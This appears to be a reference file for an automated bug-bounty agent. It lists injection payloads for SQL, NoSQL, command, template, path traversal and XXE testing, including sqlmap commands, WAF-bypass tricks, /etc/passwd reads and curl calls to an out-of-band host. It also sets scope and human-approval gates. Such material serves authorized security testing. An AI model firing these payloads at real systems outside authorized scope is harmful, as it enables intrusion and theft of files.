---
name: bb-injection
description: "bb-injection — Injection Testing Reference. Companion to `bb-ops/playbooks/{sqli,nosqli,cmdi,ssti,lfi,xxe,deserialization,rce}.yaml`. Load in injection-analyzer tasks. Scope-guard every host first."
---

# bb-injection — Injection Testing Reference

Companion to `bb-ops/playbooks/{sqli,nosqli,cmdi,ssti,lfi,xxe,deserialization,rce}.yaml`.
Load in injection-analyzer tasks. Scope-guard every host first.

## SQLi
```
# manual boolean/time probes first
curl -s "https://HOST/EP?id=1' AND '1'='1" ; curl -s "https://HOST/EP?id=1' AND '1'='2"
curl -s "https://HOST/EP?id=1' AND SLEEP(5)-- -"        # mysql
curl -s "https://HOST/EP?id=1; WAITFOR DELAY '0:0:5'--"  # mssql
# full scan only after a signal:
sqlmap -u "https://HOST/EP?id=1" --batch --level=2 --risk=2 --dbms=<detected> --dbs --threads=4
```
- Error-based: look for `MySQL Syntax Error`, `SQLiteException`, `ORA-`, `PostgreSQL`.
- Oracle: `'||(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT SUBSTR(user,1,30) FROM dual)))||CHR(62))||'`
- WAF bypass: `%09`/`%0a` whitespace, `/**/` comments, double-URL-encode, hex literals.

## NoSQLi
```
# JSON body operator injection
{"username":{"$ne":null},"password":{"$ne":null}}
{"username":{"$regex":".*"},"password":{"$gt":""}}
# query param form (often URL-decoded into operators)
?username[$ne]=x&password[$ne]=x
```

## CMDi
```
;curl <OAST>/a ; ||ping -c 1 <OAST> ; $(sleep 5) ; `sleep 5` ; %0acurl <OAST>/b
# windows: ping -n 5 127.0.0.1 & whoami
```
- Blind: pair with OAST; time-based `sleep`/`ping -n`.

## SSTI
```
# polyglot probe
${{<%[%'\"}}%\x
# engine probes (reflection of 49 = signal)
{{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>  {{7*7}}|join:*
# then confirm engine (jinja/twig/freemarker) before any RCE payload
```
- Stored contexts count: role names, config values, email templates rendered server-side.

## LFI / path traversal
```
../../../../etc/passwd      ..%2f..%2f..%2f..%2fetc%2fpasswd
..%252f..%252fetc%252fpasswd   %2e%2e%2f%2e%2e%2f
/../../../../etc/passwd     ....//....//....//etc/passwd
php://filter/convert.base64-encode/resource=config.php   (if php)
```

## XXE
```
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
<!DOCTYPE x [<!ENTITY % e SYSTEM "http://OAST/e"> %e;]><r/>
```
- Blind: parameter entities + external DTD; error-based XXE exfil.

## Deserialization (gated — human approval required to execute)
- Fingerprint only: malformed serialized bytes, observe stack trace (`ObjectInputStream`,
  `pickle.loads`, `Marshal.load`).
- Never auto-run ysoserial/pickle RCE — raise a manual task.

## Output
- Save HTTP pair + timing to evidence; emit `finding.candidate`; never self-confirm.
